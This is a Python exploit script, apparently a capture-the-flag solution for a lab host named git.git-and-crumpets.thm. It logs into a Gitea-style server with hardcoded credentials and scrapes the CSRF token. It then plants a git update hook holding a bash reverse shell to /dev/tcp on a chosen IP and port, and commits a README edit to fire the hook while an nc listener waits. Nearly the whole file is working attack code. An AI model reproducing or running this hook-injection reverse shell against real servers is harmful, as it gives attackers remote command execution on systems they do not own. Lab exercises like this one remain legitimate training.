#!/usr/bin/python3

import requests
import sys
import string
import re
import os
import random

edit = ''.join([ random.choice(string.ascii_letters) for something in range(20) ])

usage = "[+] Usage: python3 " + sys.argv[0] + " YourIP YourPort\n[*] Note: 1. Common Ports are blocked\n2. Add git.git-and-crumpets to your /etc/hosts file"

try:
	recieveip = sys.argv[1]
	recieveport = sys.argv[2]
except:
	print(usage)
	sys.exit()
	
session = requests.Session()

data = {
  'user_name': 'scones',
  'password': 'Password',
  'remember': 'on'
}

print("[*] Grabbing CSRF Token...")

response = session.post('http://git.git-and-crumpets.thm/user/login', data=data)
csrf_token = re.findall('input type="hidden" name="_csrf" value="(.*?)"', response.text)
csrf_token = csrf_token[0]

print("[*] Creating Hook...")

payload = f"\n#!/bin/bash\nbash -i >& /dev/tcp/{recieveip}/{recieveport} 0>&1"
print("[+] Payload: " + payload)

data = {
  '_csrf': csrf_token,
  'content': payload
}

response = session.post('http://git.git-and-crumpets.thm/scones/cant-touch-this/settings/hooks/git/update', data=data)
print("[*] Editing Content...")

data = {
  '_csrf': csrf_token,
  'page_has_posted': '',
  'tree_path': 'README.md',
  'content': edit,
  'commit_summary': 'Updated',
  'commit_message': '',
  'commit_choice': 'direct',
  'new_branch_name': 'scones-patch-1'
}

print("[*] Getting A Shell...")
print("[*] Note: May take upto 20 seconds")
command = "nc -lnvp " + recieveport + " | xte 'keydown Control_L' 'key Z' 'keyup Control_L'"
try:
	os.system(command)
	response = session.post('http://git.git-and-crumpets.thm/scones/cant-touch-this/_edit/master/README.md', data=data, timeout=20)
except:
	print("[+] Done!")
	os.system('fg')

session.close()
